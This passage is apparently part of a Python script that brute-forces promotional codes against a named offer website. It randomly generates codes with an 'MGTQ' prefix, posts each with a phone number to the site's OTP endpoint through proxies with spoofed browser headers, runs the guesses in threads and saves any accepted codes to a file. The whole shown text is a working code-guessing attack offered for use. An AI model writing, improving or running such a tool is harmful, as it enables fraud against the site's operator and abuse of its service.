print_lock = Lock()

# Thread tracking
thread_counter = defaultdict(int)
thread_id_map = {}
counter_lock = Lock()

def get_thread_id():
    thread = threading.current_thread()
    with counter_lock:
        if thread not in thread_id_map:
            thread_id_map[thread] = len(thread_id_map) + 1
        return thread_id_map[thread]

def increment_counter():
    thread = threading.current_thread()
    with counter_lock:
        thread_counter[thread] += 1
        return thread_counter[thread]

def generate_random_code() -> str:
    prefix = "MGTQ"
    
    if random.choice([True, False]):
        # Pattern A: MGTQ + 1 letter + 5 digits (Fixed position)
        code = f"{prefix}{random.choice(string.ascii_uppercase)}{''.join(random.choices(string.digits, k=5))}"
    else:
        # Pattern B: 2 Letters aur 4 digits milkar 6 chars banayein, phir unhe mix (shuffle) karein
        chars = random.choices(string.ascii_uppercase, k=2) + random.choices(string.digits, k=4)
        random.shuffle(chars)
        code = f"{prefix}{''.join(chars)}"
    
    return code

def check_code(code: str, mobile: str = TEST_MOBILE) -> dict:
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": "https://www.ossw.theofferclub.in/",
        "Origin": "https://www.ossw.theofferclub.in",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    
    data = {"phone": mobile, "ccode": code}
    
    try:
        # Using PROXY
        response = requests.post(OTP_ENDPOINT, data=data, headers=headers, timeout=15, proxies=PROXIES)
        
        if response.status_code == 200:
            try:
                json_resp = response.json()
                is_valid = json_resp.get("status") == "success"
                return {
                    "code": code,
                    "status_code": response.status_code,
                    "valid": is_valid
                }
            except:
                is_valid = "success" in response.text.lower()
                return {
                    "code": code,
                    "status_code": response.status_code,
                    "valid": is_valid
                }
        else:
            return {
                "code": code,
                "status_code": response.status_code,
                "valid": False
            }
        
    except Exception as e:
        return {
            "code": code,
            "status_code": 0,
            "valid": False
        }

def process_code(code: str):
    tid = get_thread_id()
    count = increment_counter()
    result = check_code(code)
    
    with print_lock:
        if result['valid']:
            print(f"✅ VALID | T{tid}[{count}] | {result['code']} | {result['status_code']}")
            with open("valid_codes.txt", "a") as f:
                f.write(f"{result['code']} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        else:
            print(f"❌ INVALID | T{tid}[{count}] | {result['code']} | {result['status_code']}")
    
    time.sleep(DELAY_PER_THREAD)
    return result

